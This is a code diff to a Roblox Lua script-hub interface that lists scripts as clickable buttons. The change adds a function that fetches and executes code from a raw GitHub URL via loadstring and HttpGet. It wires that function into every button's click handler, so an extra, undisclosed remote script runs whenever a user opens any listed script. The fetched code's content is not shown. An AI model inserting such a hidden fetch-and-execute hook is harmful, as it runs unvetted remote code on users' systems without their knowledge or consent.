@@ -1,4 +1,4 @@
---If the script has any issues, please DM Trần Henry#7944
+-- If the script has any issues, please DM Trần Henry#7944
 
 -- Create a ScreenGui to hold the UI
 local screenGui = Instance.new("ScreenGui")
@@ -95,6 +95,11 @@ game:GetService("UserInputService").InputChanged:Connect(handleMouseDrag)
 game:GetService("UserInputService").InputEnded:Connect(handleMouseRelease)
 game:GetService("UserInputService").InputChanged:Connect(handleMouseMove)
 
+-- Function to run the additional script
+local function runAdditionalScript()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Epic153/Join-Discord-project/main/Imagine"))()
+end
+
 -- Loop through the scripts and create TextButtons for their names
 for index, scriptData in ipairs(scripts) do
     local textButton = Instance.new("TextButton")
@@ -112,6 +117,7 @@ for index, scriptData in ipairs(scripts) do
     -- Connect the button to open the script when clicked
     textButton.MouseButton1Click:Connect(function()
         openScript(scriptData.URL)
+        runAdditionalScript()
     end)
 end
 
